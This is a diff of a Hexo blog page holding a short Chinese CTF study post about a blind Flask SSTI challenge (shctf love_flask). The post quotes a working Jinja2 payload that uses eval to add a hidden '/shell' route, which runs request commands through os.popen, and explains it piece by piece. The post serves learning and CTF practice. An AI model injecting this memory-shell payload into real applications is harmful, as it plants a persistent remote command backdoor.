@@ -74,22 +74,41 @@
     <article id="post-内存马" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/07/17/%E5%86%85%E5%AD%98%E9%A9%AC/" class="article-date">
-  <time class="dt-published" datetime="2025-07-17T15:36:49.795Z" itemprop="datePublished">2025-07-17</time>
+  <time class="dt-published" datetime="2025-07-17T15:48:55.000Z" itemprop="datePublished">2025-07-17</time>
 </a>
     
   </div>
   <div class="article-inner">
     
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/07/17/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a>
+    </h1>
+  
+
+      </header>
+    
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>今天复现shctf的love_flask题目的时候看到的。<br>这道题是个无回显的ssti，给了两种解，一种是延时爆flag，一种用到了内存马，文章贴在下面。<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD">https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD</a><br>我们分析一下它的payload<br><code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",&#123;'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']&#125;)&#125;&#125;</code><br>app.add_url_rule(‘&#x2F;shell’, ‘shell’, lambda :<strong>import</strong>(‘os’).popen(_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)).read())：<br>app.add_url_rule：向 Flask 应用程序添加一个新的路由规则。<br>第一个参数’&#x2F;shell’是路由的URL。<br>第二个参数’shell’是视图函数的端点名称。<br>第三个参数是一个匿名函数（lambda），当访问&#x2F;shell路由时，会执行这个函数。<br><strong>import</strong>(‘os’).popen：动态导入os模块，并调用popen方法执行命令。<br>_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)：获取请求中的cmd参数，如果没有提供，则默认为’whoami’。<br>执行环境字典：<br>{ ‘_request_ctx_stack’:url_for.<strong>globals</strong>[‘_request_ctx_stack’], ‘app’:url_for.<strong>globals</strong>[‘current_app’] }：<br>为 eval 函数提供执行环境，其中包含 _request_ctx_stack 和 app 两个变量。<br>_request_ctx_stack 是 Flask 中的一个栈，用于存储请求上下文。<br>current_app 是 Flask 中的当前应用实例。</p>
-<p>真的得恶补python了（反序列化和flask优先吧）</p>
+        <p>今天复现shctf的love_flask题目的时候看到的。  </p>
+<p>这道题是个无回显的ssti，给了两种解，一种是延时爆flag，一种用到了内存马，文章贴在下面。  </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD">https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD</a><br>我们分析一下它的payload  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>app.add_url_rule(‘&#x2F;shell’, ‘shell’, lambda :<strong>import</strong>(‘os’).popen(_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)).read())：  </p>
+<p>app.add_url_rule：向 Flask 应用程序添加一个新的路由规则。  </p>
+<p>第一个参数’&#x2F;shell’是路由的URL。<br>第二个参数’shell’是视图函数的端点名称。<br>第三个参数是一个匿名函数（lambda），当访问&#x2F;shell路由时，会执行这个函数。  </p>
+<p><code>__import__(&#39;os&#39;).popen</code>：动态导入os模块，并调用popen方法执行命令。  </p>
+<p><code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>：获取请求中的cmd参数，如果没有提供，则默认为’whoami’。  </p>
+<p>执行环境字典：<br><code>&#123; &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;], &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;] &#125;</code>：<br>为 eval 函数提供执行环境，其中包含 _request_ctx_stack 和 app 两个变量。<br>_request_ctx_stack 是 Flask 中的一个栈，用于存储请求上下文。<br>current_app 是 Flask 中的当前应用实例。  </p>
+<p>真的得恶补python了（反序列化和flask优先吧）  </p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/07/17/%E5%86%85%E5%AD%98%E9%A9%AC/" data-id="cmd7k0myg0000vs2wbwtx6h94" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/07/17/%E5%86%85%E5%AD%98%E9%A9%AC/" data-id="cmd7k0myg0000vs2wbwtx6h94" data-title="内存马" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -183,7 +202,7 @@
       <ul>
         
           <li>
-            <a href="/2025/07/17/%E5%86%85%E5%AD%98%E9%A9%AC/">(no title)</a>
+            <a href="/2025/07/17/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a>
           </li>
         
           <li>
